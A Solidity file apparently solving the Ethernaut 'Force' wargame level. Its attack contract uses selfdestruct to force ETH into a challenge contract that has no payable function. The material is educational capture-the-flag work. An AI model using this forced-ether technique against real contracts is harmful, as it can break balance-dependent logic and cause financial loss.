// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

/**
 * @title 7. FORCE
 * @dev FInd a way to send ETH to the contract to complete this level.
 */

contract Ethernaut_Force {
    address private target = 0xD0350fE26d963C9B0974Cab2b5a55D72B02566a3; // Replace with your Force instance

    // Selfdestruct the contract will force send all the contract's balance to the target address
    // Will be deprecated soon to prevent this behavior
    function attack() public payable {
        address payable addr = payable(address(target));
        selfdestruct(addr);
    }
}

// 🎉 Level completed! 🎉

/*////////////////////////////////////////////////////////////////
                        CHALLENGE CONTRACT
////////////////////////////////////////////////////////////////*/

contract Force {
    /*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/
}
